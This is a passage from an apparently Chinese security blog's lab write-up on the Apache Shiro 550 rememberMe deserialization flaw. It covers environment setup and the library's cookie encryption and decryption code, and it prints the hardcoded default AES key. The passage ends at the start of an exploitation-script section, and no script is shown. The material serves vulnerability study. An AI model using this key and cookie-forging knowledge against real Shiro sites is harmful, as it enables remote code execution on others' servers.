class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-comment">&lt;!--            &lt;scope&gt;provided&lt;/scope&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.sourceforge.htmlunit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>htmlunit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-comment">&lt;!--            &lt;scope&gt;test&lt;/scope&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="编译打包"><a href="#编译打包" class="headerlink" title="编译打包"></a>编译打包</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">命令行下<span class="hljs-keyword">mvn</span> compile编译生成target文件<br>命令行下<span class="hljs-keyword">mvn</span> package打包生成war文件<br></code></pre></td></tr></table></figure><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[ERROR]</span> Failed to execute goal org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.plugins</span>:maven-toolchains-plugin:<span class="hljs-number">1.1</span>:toolchain (default) on project samples-web: Cannot find matching toolchain definitions <span class="hljs-keyword">for</span> the following toolchain types:<br><span class="hljs-selector-attr">[ERROR]</span> jdk <span class="hljs-selector-attr">[ vendor=<span class="hljs-string">&#x27;sun&#x27;</span> version=<span class="hljs-string">&#x27;1.6&#x27;</span> ]</span><br><span class="hljs-selector-attr">[ERROR]</span> Please make sure you define the required toolchains <span class="hljs-keyword">in</span> your ~/.m2/toolchains<span class="hljs-selector-class">.xml</span> file.<br><span class="hljs-selector-attr">[ERROR]</span> -&gt; <span class="hljs-selector-attr">[Help 1]</span><br><span class="hljs-selector-attr">[ERROR]</span> <br><span class="hljs-selector-attr">[ERROR]</span> To see the full stack trace of the errors, re-run Maven with the -e <span class="hljs-selector-tag">switch</span>.<br><span class="hljs-selector-attr">[ERROR]</span> Re-run Maven using the -X <span class="hljs-selector-tag">switch</span> to enable full debug logging.<br><span class="hljs-selector-attr">[ERROR]</span> <br><span class="hljs-selector-attr">[ERROR]</span> For more information about the errors and possible solutions, please read the following articles:<br><span class="hljs-selector-attr">[ERROR]</span> <span class="hljs-selector-attr">[Help 1]</span> http:<span class="hljs-comment">//cwiki.apache.org/confluence/display/MAVEN/MojoFailureException</span><br></code></pre></td></tr></table></figure><p><strong>Maven Toolchains Plugin</strong> 无法找到符合要求的 JDK 工具链配置，需要 <strong>Sun JDK 1.6</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">C:\Users\<span class="hljs-tag">&lt;<span class="hljs-name">你的用户名</span>&gt;</span>\.m2\目录下创建toolchains.xml<br></code></pre></td></tr></table></figure><p>添加配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">toolchains</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Sun/Oracle JDK 1.6 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">toolchain</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>jdk<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">provides</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">vendor</span>&gt;</span>sun<span class="hljs-tag">&lt;/<span class="hljs-name">vendor</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">provides</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">jdkHome</span>&gt;</span>/path/to/jdk1.6<span class="hljs-tag">&lt;/<span class="hljs-name">jdkHome</span>&gt;</span> <span class="hljs-comment">&lt;!-- 替换为你的 JDK 1.6 路径 --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">toolchain</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">toolchains</span>&gt;</span><br></code></pre></td></tr></table></figure><p>下载链接：</p><p><a href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html">https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</a></p><h4 id="添加运行环境"><a href="#添加运行环境" class="headerlink" title="添加运行环境"></a>添加运行环境</h4><p>jdk8u65</p><p>tomcat8.5.81</p><p>Run&#x2F;Edit Configurations</p><p><img src="/2025/04/12/shiro550/image-20250411215238384-17447264036676.png" alt="image-20250411215238384"></p><p>Deployment</p><p><img src="/2025/04/12/shiro550/image-20250411215316111-17447264036673.png" alt="image-20250411215316111"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在登录shiro成功，选择了remeberMe选项，网站会生成一个key为remeberMe的Cookie、<img src="/2025/04/12/shiro550/image-20250411222041042-17447264036674.png" alt="image-20250411222041042"></p><h3 id="Cookie加密分析"><a href="#Cookie加密分析" class="headerlink" title="Cookie加密分析"></a>Cookie加密分析</h3><h4 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h4><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类中寻找相关函数</p><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</code></p><p>初始时Cookie为空，获取Cookie，将序列化后的数据base64编码后存入到Cookie中，得到{remeberme:base64_encode}，然后将Cookie保存到返回包中。</p><p>这是存入Cookie的过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rememberSerializedIdentity</span><span class="hljs-params">(Subject subject, <span class="hljs-type">byte</span>[] serialized)</span> &#123;<br><br>    <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subject)) &#123;<br>        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +<br>                <span class="hljs-string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +<br>                <span class="hljs-string">&quot;ignoring rememberMe operation.&quot;</span>;<br>            log.debug(msg);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br><br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(subject);<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(subject);<br><br>    <span class="hljs-comment">//base 64 encode it and store as a cookie:</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.encodeToString(serialized);<br><br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> getCookie(); <span class="hljs-comment">//the class attribute is really a template for the outgoing cookies</span><br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCookie</span>(template);<br>    cookie.setValue(base64);<br>    cookie.saveTo(request, response);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h4><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code></p><p>这里将用户信息进行序列化，然后加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rememberIdentity</span><span class="hljs-params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;<br>    <span class="hljs-type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);<br>    rememberSerializedIdentity(subject, bytes);<br>&#125;<br><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;<br>    <span class="hljs-type">byte</span>[] bytes = serialize(principals);<br>    <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-literal">null</span>) &#123;<br>        bytes = encrypt(bytes);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bytes;<br>&#125;<br><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] encrypt(<span class="hljs-type">byte</span>[] serialized) &#123;<br>    <span class="hljs-type">byte</span>[] value = serialized;<br>    <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());<br>        value = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>加密相关信息</p><p>使用AES加密，密钥是固定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> CipherService <span class="hljs-title function_">getCipherService</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> cipherService;<br>    &#125;<br><span class="hljs-comment">// </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AbstractRememberMeManager</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.serializer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();<br>        <span class="hljs-built_in">this</span>.cipherService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br></code></pre></td></tr></table></figure><p>加密算法详情，CBC模式，初始化向量128bits</p><p><img src="/2025/04/12/shiro550/image-20250411225123981-17447264036675.png" alt="image-20250411225123981"></p><h3 id="Cookie解密分析"><a href="#Cookie解密分析" class="headerlink" title="Cookie解密分析"></a>Cookie解密分析</h3><h4 id="CookieRememberMeManager-1"><a href="#CookieRememberMeManager-1" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h4><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code><br>作用：subjectContext 中获取(base64_decode)被“记住”的用户身份序列化数据（通常是字节数组）</p><p>关于<code>SubjectContext</code><br>Shiro 抽象的上下文容器，可能包含请求信息，但目的是为构建 Subject 服务。包括<br>请求&#x2F;响应对象（可能包含 HTTP 请求报文内容）<br>会话（Session）信息<br>记住我（RememberMe）的令牌或标识<br>Web 环境中，Shiro 会通过 WebUtils 将 HttpServletRequest 和 HttpServletResponse 封装到 SubjectContext 中。</p><p>DELETED_COOKIE_VALUE为 <code>deleteMe</code>，只要cookie的值不是<code>deleteMe</code>，则会进行后续的解析操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br>    .....<br>    <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response);<br>    <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>        base64 = ensurePadding(base64);<br>        <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>            log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64);<br>        <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>            log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> decoded;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//no cookie set - new site visitor?</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="AbstractRememberMeManager-1"><a href="#AbstractRememberMeManager-1" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h4><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code></p><p>getRememberedPrincipals方法</p><p>调用getRememberedSerializedIdentity，获取序列化数据，<br>调用convertBytesToPrincipals解析数据<br>&#x3D;&#x3D;&gt;<br>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals<br>先解密，后反序列化<br>&#x3D;&#x3D;&gt;<br>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt<br>org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title function_">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> &#123;<br>    <span class="hljs-type">PrincipalCollection</span> <span class="hljs-variable">principals</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<br>        <span class="hljs-comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br>        <span class="hljs-keyword">if</span> (bytes != <span class="hljs-literal">null</span> &amp;&amp; bytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>            principals = convertBytesToPrincipals(bytes, subjectContext);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException re) &#123;<br>        principals = onRememberedPrincipalFailure(re, subjectContext);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> principals;<br>&#125;<br><br><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title function_">convertBytesToPrincipals</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;<br>    <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-literal">null</span>) &#123;<br>        bytes = decrypt(bytes);<br>    &#125;<br>    <span class="hljs-keyword">return</span> deserialize(bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析 <code>decrypt</code>，追溯加密使用还是AES，AES是对称加密，密钥也是和加密密钥一致的。但还是使用两个方法分别赋值加密密钥和解密密钥，可能是为了后期的更换加密算法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] encrypted) &#123;<br>    <span class="hljs-type">byte</span>[] serialized = encrypted;<br>    <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCipherKey</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] cipherKey)</span> &#123;<br>    <span class="hljs-comment">//Since this method should only be used in symmetric ciphers</span><br>    <span class="hljs-comment">//(where the enc and dec keys are the same), set it on both:</span><br>    setEncryptionCipherKey(cipherKey);<br>    setDecryptionCipherKey(cipherKey);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p><code>org.apache.shiro.crypto.JcaCipherService</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ByteSource <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ciphertext, <span class="hljs-type">byte</span>[] key)</span> <span class="hljs-keyword">throws</span> CryptoException &#123;<br><br>    <span class="hljs-type">byte</span>[] encrypted = ciphertext;<br><br>    <span class="hljs-comment">//No IV, check if we need to read the IV from the stream:</span><br>    <span class="hljs-type">byte</span>[] iv = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (isGenerateInitializationVectors(<span class="hljs-literal">false</span>)) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span><br>            <span class="hljs-comment">//is:</span><br>            <span class="hljs-comment">// - the first N bytes is the initialization vector, where N equals the value of the</span><br>            <span class="hljs-comment">// &#x27;initializationVectorSize&#x27; attribute.</span><br>            <span class="hljs-comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span><br><br>            <span class="hljs-comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span><br>            <span class="hljs-comment">//the IV to decrypt the real ciphertext:</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">ivSize</span> <span class="hljs-operator">=</span> getInitializationVectorSize();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">ivByteSize</span> <span class="hljs-operator">=</span> ivSize / BITS_PER_BYTE;<br><br>            <span class="hljs-comment">//now we know how large the iv is, so extract the iv bytes:</span><br>            iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[ivByteSize];<br>            System.arraycopy(ciphertext, <span class="hljs-number">0</span>, iv, <span class="hljs-number">0</span>, ivByteSize);<br><br>            <span class="hljs-comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">encryptedSize</span> <span class="hljs-operator">=</span> ciphertext.length - ivByteSize;<br>            encrypted = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encryptedSize];<br>            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="hljs-number">0</span>, encryptedSize);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CryptoException</span>(msg, e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> decrypt(encrypted, key, iv);<br>&#125;<br></code></pre></td></tr></table></figure><p>密文先将IV提取出来，所以需要将IV和序列化数据组合在base64编码。</p><h3 id="序列化分析"><a href="#序列化分析" class="headerlink" title="序列化分析"></a>序列化分析</h3><p><code>org.apache.shiro.io.DefaultSerializer</code></p><p>直接在内存中操作字节数组，与我们之前写的操作方式不同，原理相同，从输出流进行序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> SerializationException &#123;<br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span>) &#123;……<br>    &#125;<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(baos);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>       ……<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> SerializationException &#123;<br>    <span class="hljs-keyword">if</span> (serialized == <span class="hljs-literal">null</span>) &#123;……<br>    &#125;<br>    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br>    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(bais);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassResolvingObjectInputStream</span>(bis);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span><br>        <span class="hljs-type">T</span> <span class="hljs-variable">deserialized</span> <span class="hljs-operator">=</span> (T) ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> deserialized;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;……<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 